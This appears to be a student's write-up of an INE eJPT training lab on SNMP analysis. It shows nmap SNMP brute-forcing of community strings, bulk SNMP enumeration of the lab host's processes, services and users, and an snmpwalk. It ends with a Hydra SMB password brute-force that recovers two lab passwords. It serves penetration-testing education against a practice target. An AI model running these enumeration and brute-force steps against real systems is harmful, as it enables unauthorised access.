```jsx
Lab Name: SNMP Analysis
Platform: INE
Lab No: 21
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
root@INE:~# ping -c 2 demo.ine.local
PING demo.ine.local (10.4.25.186) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.25.186): icmp_seq=1 ttl=125 time=10.5 ms
64 bytes from demo.ine.local (10.4.25.186): icmp_seq=2 ttl=125 time=9.59 ms

--- demo.ine.local ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.593/10.036/10.480/0.443 ms
```

## NMAP Scans and Scripts:

```console
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 18:04 IST
Nmap scan report for demo.ine.local (10.4.25.186)
Host is up (0.0097s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
```

```console
root@INE:~# nmap -sU -p 161 --script=snmp-brute demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 18:07 IST
Nmap scan report for demo.ine.local (10.4.25.186)
Host is up (0.0097s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
```

```console
root@INE:~# nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
root@INE:~# cat snmp_output 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 18:17 IST
Nmap scan report for demo.ine.local (10.4.25.186)
Host is up (0.0098s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   84: 
|     Name: Registry
|   264: 
|     Name: smss.exe
|   300: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k termsvcs -s TermService
|   392: 
|     Name: csrss.exe
|   468: 
|     Name: csrss.exe
|   488: 
|     Name: wininit.exe
|   556: 
|     Name: winlogon.exe
|   600: 
|     Name: services.exe
|   620: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   672: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s NcbService
|   724: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch -p -s PlugPlay
|   744: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch -p
|   764: 
|     Name: fontdrvhost.exe
|   772: 
|     Name: fontdrvhost.exe
|   788: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s WdiSystemHost
|   844: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
|   848: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS -p
|   892: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch -p -s LSM
|   956: 
|     Name: ctfmon.exe
|   960: 
|     Name: dwm.exe
|   1008: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   1012: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s DsmSvc
|   1064: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted -p -s EventLog
|   1200: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s ProfSvc
|   1208: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k netsvcs -p -s Themes
|   1216: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s gpsvc
|   1224: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService -p -s EventSystem
|   1248: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService -p -s nsi
|   1308: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s Dhcp
|   1356: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s SENS
|   1400: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork -p
|   1452: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService -p -s NlaSvc
|   1472: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkService -p -s Dnscache
|   1480: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted -p
|   1488: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s Schedule
|   1520: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNoNetwork -p -s DPS
|   1648: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k netsvcs -p -s ShellHWDetection
|   1656: 
|     Name: amazon-ssm-agent.exe
|     Path: C:\Program Files\Amazon\SSM\
|   1676: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalService -p -s netprofm
|   1684: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService -p -s FontCache
|   1724: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s UmRdpService
|   1780: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetworkFirewall -p
|   1848: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc
|   1916: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -s CertPropSvc
|   1964: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService -p -s LanmanWorkstation
|   2000: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s UserManager
|   2088: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k netsvcs -p -s SessionEnv
|   2184: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s IKEEXT
|   2192: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted -p -s PolicyAgent
|   2224: 
|     Name: CompatTelRunner.exe
|     Path: C:\Windows\system32\
|     Params: -m:invagent.dll -f:RunUpdate -cv:tGGIJtejP0e55HsK.5
|   2236: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k smbsvcs -s LanmanServer
|   2324: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   2432: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkService -p -s CryptSvc
|   2440: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s Winmgmt
|   2452: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k netsvcs -p -s Browser
|   2516: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   2560: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted -p -s SysMain
|   2580: 
|     Name: vds.exe
|     Path: C:\Windows\System32\
|   2592: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s TrkWks
|   2624: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService -s W32Time
|   2652: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService -p -s WinRM
|   2676: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s WpnService
|   2824: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetSvcs -p -s iphlpsvc
|   3020: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s TokenBroker
|   3248: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted -p -s lmhosts
|   3316: 
|     Name: TiWorker.exe
|     Path: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1450_none_56e6965b991df4af\
|     Params: -Embedding
|   3376: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3572: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s TabletInputService
|   3620: 
|     Name: CompatTelRunner.exe
|     Path: C:\Windows\system32\
|     Params: -maintenance
|   3788: 
|     Name: explorer.exe
|     Path: C:\Windows\
|   3816: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService -p -s CDPSvc
|   3928: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel -p -s StateRepository
|   3980: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k UnistackSvcGroup -s CDPUserSvc
|   3996: 
|     Name: sihost.exe
|   4008: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k UnistackSvcGroup -s WpnUserService
|   4024: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted -p -s UALSVC
|   4040: 
|     Name: taskhostw.exe
|     Params: {222A245B-E637-4AE9-A93F-A59CA119A75E}
|   4180: 
|     Name: svchost.exe
|   4248: 
|     Name: TrustedInstaller.exe
|     Path: C:\Windows\servicing\
|   4280: 
|     Name: ShellExperienceHost.exe
|     Path: C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\
|     Params:  -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
|   4372: 
|     Name: SearchUI.exe
|     Path: C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\
|     Params:  -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
|   4416: 
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   4544: 
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   4588: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalService -p -s LicenseManager
|   4600: 
|     Name: taskhostw.exe
|   4604: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s StorSvc
|   4680: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s DsSvc
|   4768: 
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   4792: 
|     Name: conhost.exe
|     Path: \??\C:\Windows\system32\
|     Params: 0x4
|   5008: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs -p -s UsoSvc
|   5036: 
|     Name: WmiPrvSE.exe
|_    Path: C:\Windows\system32\wbem\
| snmp-win32-software: 
|   AWS PV Drivers; 2020-09-09T03:39:12
|   AWS Tools for Windows; 2020-09-09T03:45:04
|   Amazon SSM Agent; 2020-09-09T03:38:42
|   Amazon SSM Agent; 2020-09-09T03:38:38
|   Mozilla Firefox 82.0.2 (x64 en-US); 2020-11-07T07:47:26
|   Mozilla Maintenance Service; 2020-11-07T07:47:26
|_  aws-cfn-bootstrap; 2020-06-10T05:37:48
| snmp-win32-services: 
|   Amazon SSM Agent
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   Certificate Propagation
|   Computer Browser
|   Connected Devices Platform Service
|   Connected Devices Platform User Service_2f771
|   CoreMessaging
|   Credential Manager
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic System Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   RPC Endpoint Mapper
|   Remote Desktop Configuration
|   Remote Desktop Services
|   Remote Desktop Services UserMode Port Redirector
|   Remote Procedure Call (RPC)
|   SNMP Service
|   Security Accounts Manager
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   SysMain
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Time Broker
|   Touch Keyboard and Handwriting Panel Service
|   Update Orchestrator Service
|   User Access Logging Service
|   User Manager
|   User Profile Service
|   Virtual Disk
|   Web Account Manager
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Connection Manager
|   Windows Defender Firewall
|   Windows Event Log
|   Windows Font Cache Service
|   Windows License Manager Service
|   Windows Management Instrumentation
|   Windows Modules Installer
|   Windows Push Notifications System Service
|   Windows Push Notifications User Service_2f771
|   Windows Remote Management (WS-Management)
|   Windows Time
|   Windows Update Medic Service
|_  Workstation
| snmp-netstat: 
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:3389         0.0.0.0:0
|   TCP  0.0.0.0:5985         0.0.0.0:0
|   TCP  0.0.0.0:47001        0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  0.0.0.0:49673        0.0.0.0:0
|   TCP  10.4.25.186:139      0.0.0.0:0
|   TCP  10.4.25.186:49720    10.4.29.144:443
|   TCP  10.4.25.186:49776    10.4.26.187:443
|   TCP  10.4.25.186:49779    10.4.22.37:443
|   TCP  10.4.25.186:49780    20.72.205.209:443
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:3389         *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.4.25.186:137      *:*
|   UDP  10.4.25.186:138      *:*
|_  UDP  127.0.0.1:49664      *:*
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft 6to4 Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft IP-HTTPS Platform Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   AWS PV Network Device\x00
|     MAC address: 06:0e:a4:32:96:de (Unknown)
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft Kernel Debug Network Adapter\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft Teredo Tunneling Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82599 Virtual Function\x00
|     MAC address: 06:11:0c:e2:d8:1e (Unknown)
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Amazon Elastic Network Adapter\x00
|     IP address: 10.4.25.186  Netmask: 255.255.240.0
|     MAC address: 0e:98:8d:0a:ba:2b (Unknown)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 580.25 Kb sent, 603.46 Kb received
|   Amazon Elastic Network Adapter-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 0e:98:8d:0a:ba:2b (Unknown)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 580.25 Kb sent, 603.46 Kb received
|   Amazon Elastic Network Adapter-QoS Packet Scheduler-0000\x00
|     MAC address: 0e:98:8d:0a:ba:2b (Unknown)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 580.25 Kb sent, 603.46 Kb received
|   Amazon Elastic Network Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 0e:98:8d:0a:ba:2b (Unknown)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 580.25 Kb sent, 603.46 Kb received
| snmp-sysdescr: Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
|_  System uptime: 17m48.76s (106876 timeticks)
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|_  admin
```

## SNMP Walk:

```console
root@INE:~# snmpwalk -v 1 -c public demo.ine.local
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.2
iso.3.6.1.2.1.1.3.0 = Timeticks: (92850) 0:15:28.50
iso.3.6.1.2.1.1.4.0 = ""
iso.3.6.1.2.1.1.5.0 = STRING: "AttackDefense"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 11
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.3 = INTEGER: 3
iso.3.6.1.2.1.2.2.1.1.4 = INTEGER: 4
iso.3.6.1.2.1.2.2.1.1.5 = INTEGER: 5
iso.3.6.1.2.1.2.2.1.1.6 = INTEGER: 6
iso.3.6.1.2.1.2.2.1.1.7 = INTEGER: 7
iso.3.6.1.2.1.2.2.1.1.8 = INTEGER: 8
iso.3.6.1.2.1.2.2.1.1.9 = INTEGER: 9
iso.3.6.1.2.1.2.2.1.1.10 = INTEGER: 10
iso.3.6.1.2.1.2.2.1.1.11 = INTEGER: 11
iso.3.6.1.2.1.2.2.1.2.1 = Hex-STRING: 53 6F 66 74 77 61 72 65 20 4C 6F 6F 70 62 61 63 
6B 20 49 6E 74 65 72 66 61 63 65 20 31 00 
iso.3.6.1.2.1.2.2.1.2.2 = Hex-STRING: 4D 69 63 72 6F 73 6F 66 74 20 36 74 6F 34 20 41 
64 61 70 74 65 72 00 
iso.3.6.1.2.1.2.2.1.2.3 = Hex-STRING: 4D 69 63 72 6F 73 6F 66 74 20 49 50 2D 48 54 54
```

## Exploitation:

```console
root@INE:~# sudo nano username.txt
root@INE:~# cat username.txt 
administrator
admin
```

```console
root@INE:~# hydra -L username.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 18:44:26
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 2018 login tries (l:2/p:1009), ~2018 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: administrator   password: elizabeth                                                                      
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-31 18:44:30
```
